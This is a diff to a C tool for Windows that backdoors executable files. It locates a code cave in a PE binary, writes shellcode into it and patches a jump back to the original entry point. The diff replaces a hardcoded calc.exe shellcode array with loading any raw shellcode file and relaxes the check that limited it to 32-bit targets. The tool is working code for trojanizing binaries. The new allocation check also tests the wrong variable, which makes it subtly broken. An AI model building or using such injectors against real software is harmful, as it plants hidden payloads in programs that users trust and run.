@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <Windows.h>
 
+
 typedef struct _CAVE_INFO
 {
 	PBYTE pStartAddress;
@@ -104,32 +105,12 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, CAVE_I
 	return 0;
 }
 
-BOOL generatePayload(DWORD originalEntryPoint, PCAVE_INFO pCaveInfo, PBYTE pCaveAddress)
+BOOL generatePayload(DWORD originalEntryPoint, PCAVE_INFO pCaveInfo, PBYTE pCaveAddress, PBYTE payloadBuffer, DWORD payloadSize)
 {
-	unsigned char payload[] = { 0xfc,0xe8,0x82,0x00,0x00,0x00,
-0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,
-0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
-0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
-0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,
-0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,
-0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,
-0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
-0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
-0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,
-0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,
-0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,
-0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
-0x87,0xff,0xd5,0xbb,0xaa,0xc5,0xe2,0x5d,0x68,0xa6,0x95,0xbd,
-0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,
-0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x61,
-0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
 
-
-	DWORD scSize = sizeof(payload);
-
-	printf("[+] Size of shellcode (+5): %d\n", scSize + 5);
+	printf("[+] Size of shellcode (+5): %d\n", payloadSize + 5);
 	printf("[+] Size of cave: %d\n", pCaveInfo->dwSize);
-	if (scSize + 5 > pCaveInfo->dwSize)
+	if (payloadSize + 5 > pCaveInfo->dwSize)
 	{
 		printf("\033[0;31m[!] Cave is too small for payload!\033[0m\n");
 		return FALSE;
@@ -142,17 +123,17 @@ BOOL generatePayload(DWORD originalEntryPoint, PCAVE_INFO pCaveInfo, PBYTE pCave
 	}
 
 	printf("[+] Adding shellcode to code cave\n");
-	memcpy((void*)pCaveAddress, payload, scSize);
+	memcpy((void*)pCaveAddress, payloadBuffer, payloadSize);
 
-	for (int i = 0; i < sizeof(payload); i++)
+	for (DWORD i = 0; i < payloadSize; i++)
 	{
-		if (i == sizeof(payload) - 1)
+		if (i == payloadSize - 1)
 		{
-			printf("0x%02X\n", payload[i]);
+			printf("0x%02X\n", payloadBuffer[i]);
 		}
 		else
 		{
-			printf("0x%02X, ", payload[i]);
+			printf("0x%02X, ", payloadBuffer[i]);
 		}
 		if ((i + 1) % 12 == 0)
 		{
@@ -162,31 +143,83 @@ BOOL generatePayload(DWORD originalEntryPoint, PCAVE_INFO pCaveInfo, PBYTE pCave
 
 
 	printf("[+] Adding patch back to original entrypoint RVA\n");
-	DWORD jmpRVA = pCaveInfo->rva + scSize;
+	DWORD jmpRVA = pCaveInfo->rva + payloadSize;
 	LONG rel32 = (LONG)(originalEntryPoint - (jmpRVA + 5));
 
-	pCaveAddress[scSize] = 0xE9; // jmp
-	*(LONG*)(pCaveAddress + scSize + 1) = rel32;
+	pCaveAddress[payloadSize] = 0xE9; // jmp
+	*(LONG*)(pCaveAddress + payloadSize + 1) = rel32;
 
 	return TRUE;
 }
 
+void getPayloadBuffer(LPCSTR payloadFile, PBYTE *pPayloadBuffer, DWORD *pPayloadSize)
+{
+	printf("[+] Loading paylaod\n");
+
+	HANDLE hPayload = CreateFileA(payloadFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hPayload == INVALID_HANDLE_VALUE)
+	{
+		printf("[*] Error opening shellcode: %d\n", GetLastError());
+		return;
+	}
+
+	DWORD payloadSize = 0;
+	payloadSize = GetFileSize(hPayload, NULL);
+
+	PBYTE payloadBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
+	if (pPayloadBuffer == NULL)
+	{
+		printf("[*] Error allocating memory for shellcode: %d\n", GetLastError());
+		CloseHandle(hPayload);
+		return;
+	}
+
+	DWORD dwBytesRead = 0;
+	if (!ReadFile(hPayload, payloadBuffer, payloadSize, &dwBytesRead, NULL))
+	{
+		printf("[*] Error reading shellcode: %d\n", GetLastError());
+		CloseHandle(hPayload);
+		HeapFree(GetProcessHeap(), 0, payloadBuffer);
+		return;
+	}
+
+	printf("[+] Read %d bytes into address space %p\n", dwBytesRead, payloadBuffer);
+
+	*pPayloadBuffer = payloadBuffer;
+	*pPayloadSize = payloadSize;
+}
+
 int main(int argc, char *argv[])
 {
-	if (argc != 2)
+	if (argc != 3)
 	{
-		printf("Usage: %s <input file>\n", argv[0]);
+		printf("Usage: %s <target binary> <raw_shellcode_file>\n", argv[0]);
 		return 1;
 	}
 
 	DWORD dwBinaryType = 100;
 	GetBinaryTypeA(argv[1], &dwBinaryType);
 
-	if (dwBinaryType != SCS_32BIT_BINARY)
+	PBYTE payloadBuffer = NULL;
+	DWORD payloadSize = 0;
+
+	getPayloadBuffer(argv[2], &payloadBuffer, &payloadSize);
+	if (payloadBuffer == NULL)
 	{
-		printf("[*] Error: The file is not a 32-bit binary.\n");
+		printf("[*] Failed to get payload buffer.\n");
 		return 1;
 	}
+	
+	if (dwBinaryType != SCS_32BIT_BINARY)
+	{
+		printf("\033[33m[+] The file is a 64-bit binary. Ensure your shellcode is also x64.\033[0m\n");
+	} 
+	else
+	{
+		printf("\033[33m[+] The file is a 32-bit binary. Ensure your shellcode is also x86.\033[0m\n");
+	}
+	printf("[+] Press any key to continue\n");
+	getchar();
 
 	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
@@ -240,7 +273,7 @@ int main(int argc, char *argv[])
 
 	PBYTE caveAddress = (PBYTE)pBuffer + caveInfo.offset;
 
-	if (!generatePayload(originalEntryPoint, &caveInfo, caveAddress))
+	if (!generatePayload(originalEntryPoint, &caveInfo, caveAddress, payloadBuffer, payloadSize))
 	{
 		UnmapViewOfFile(pBuffer);
 		CloseHandle(hMap);
